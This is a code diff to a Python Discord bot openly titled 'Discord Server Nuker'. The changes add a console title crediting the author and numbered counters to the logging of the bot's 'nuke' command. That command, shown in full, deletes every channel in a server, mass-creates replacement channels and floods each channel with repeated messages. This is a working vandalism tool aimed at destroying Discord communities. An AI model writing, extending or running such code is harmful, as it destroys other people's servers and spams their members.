@@ -20,6 +20,15 @@ if anyerror == True:
     input("")
     exit()
 
+
+try:
+    import os
+    from os import system
+    system("title " + "Discord Server Nuker,   Made By blob#0005,    Github: github.com/blob0005")
+except:
+    pass
+
+
 import json
 try:
   json_data = open("settings.json")
@@ -38,6 +47,7 @@ except:
   exit()
 
 
+
 #Bot Code
 print("Starting Bot...")
 colorama.init(autoreset=True)
@@ -47,26 +57,32 @@ async def on_ready():
   print(colorama.Fore.GREEN + f"{bot.user.name} Is Up")
 @bot.command()
 async def nuke(ctx):
+  channela = 0
+  guilda = 0
+  msga = 0
   try:
     await ctx.message.delete()
     print(colorama.Fore.GREEN + "Deleted Nuke Message")
     for channel in ctx.guild.channels:
         try:
-            print(colorama.Fore.GREEN + "Deleted Channel")
             await channel.delete()
+            channela = int(channela) + 1
+            print(colorama.Fore.GREEN + f"[{str(channela)}] Deleted Channel")
         except:
             print(colorama.Fore.RED + "Error While Deleting Channel")
     for u in range(int(amount_of_channels_to_create)):
         try:
             await ctx.guild.create_text_channel(channel_names)
-            print(colorama.Fore.GREEN + "Created Guild")
+            guilda = int(guilda) + 1
+            print(colorama.Fore.GREEN + f"[{str(guilda)}] Created Guild")
         except:
             print(colorama.Fore.RED + "Error While Creating Guild")
     for channel in ctx.guild.channels:
         for u in range(amount_of_messages_to_send_in_each_channel):
             try:
                 await channel.send(msg)
-                print(colorama.Fore.GREEN + "Sended Message")
+                msga = int(msga) + 1
+                print(colorama.Fore.GREEN + f"[{str(msga)}] Sended Message")
             except:
                 print(colorama.Fore.RED + "Error While Sending Message")
     print(f"Done Nuking {ctx.guild.id}/{ctx.guild.name}")
